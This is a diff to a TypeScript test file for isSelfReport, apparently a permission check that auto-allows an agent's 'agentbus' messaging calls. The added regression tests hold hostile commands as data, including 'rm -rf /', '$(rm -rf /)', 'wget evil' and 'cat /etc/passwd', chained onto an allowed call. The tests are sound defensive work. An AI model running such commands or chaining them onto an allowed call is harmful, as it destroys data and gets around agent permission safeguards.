@@ -45,12 +45,29 @@ describe('isSelfReport', () => {
     expect(isSelfReport('Bash', { command: `printf '%s' '{"type":"result"}' | agentbus send nagi --from ext:awe-1` }, 'nagi')).toBe(true);
     expect(isSelfReport('Bash', { command: `agentbus reply msg_1 nagi` }, 'nagi')).toBe(true);
     expect(isSelfReport('Bash', { command: `agentbus publish --from ext:awe-1` }, 'nagi')).toBe(true);
+    expect(isSelfReport('Bash', { command: `agentbus send nagi --from ext:awe-1` }, 'nagi')).toBe(true);
+  });
+  it('allows special chars INSIDE the quoted payload (must not trip the chaining check)', () => {
+    expect(isSelfReport('Bash', { command: `printf '%s' 'done; cleaned && ok' | agentbus send nagi --from ext:awe-1` }, 'nagi')).toBe(true);
+    expect(isSelfReport('Bash', { command: `agentbus send nagi --from ext:awe-1` }, 'nagi')).toBe(true);
   });
   it('does NOT match genuine tools or other recipients', () => {
     expect(isSelfReport('Bash', { command: 'rm -rf /tmp/x' }, 'nagi')).toBe(false);
     expect(isSelfReport('Bash', { command: 'agentbus send someone-else --from ext:awe-1' }, 'nagi')).toBe(false);
     expect(isSelfReport('Edit', { file_path: '/x' }, 'nagi')).toBe(false);
-    expect(isSelfReport('Bash', { command: 'echo agentbus send nagi' }, 'nagi')).toBe(false); // not actually invoking agentbus
+    expect(isSelfReport('Bash', { command: 'echo agentbus send nagi' }, 'nagi')).toBe(false);
+  });
+  it('rejects command chaining that would ride along on the allow (C1 regression)', () => {
+    expect(isSelfReport('Bash', { command: 'agentbus send nagi --from x; rm -rf /tmp/victim' }, 'nagi')).toBe(false);
+    expect(isSelfReport('Bash', { command: 'rm -rf / ; agentbus send nagi' }, 'nagi')).toBe(false);
+    expect(isSelfReport('Bash', { command: 'agentbus publish ; rm -rf /' }, 'nagi')).toBe(false);
+    expect(isSelfReport('Bash', { command: 'echo hi | agentbus send nagi && wget evil' }, 'nagi')).toBe(false);
+    expect(isSelfReport('Bash', { command: 'agentbus send nagi && rm -rf /' }, 'nagi')).toBe(false);
+    expect(isSelfReport('Bash', { command: 'agentbus send nagi || rm -rf /' }, 'nagi')).toBe(false);
+    expect(isSelfReport('Bash', { command: 'agentbus send nagi & rm -rf /' }, 'nagi')).toBe(false);
+    expect(isSelfReport('Bash', { command: '$(rm -rf /); agentbus send nagi' }, 'nagi')).toBe(false);
+    expect(isSelfReport('Bash', { command: 'agentbus send nagi --from `rm -rf /`' }, 'nagi')).toBe(false);
+    expect(isSelfReport('Bash', { command: 'cat /etc/passwd | agentbus send nagi' }, 'nagi')).toBe(false); // feeder is not printf/echo
   });
 });
 
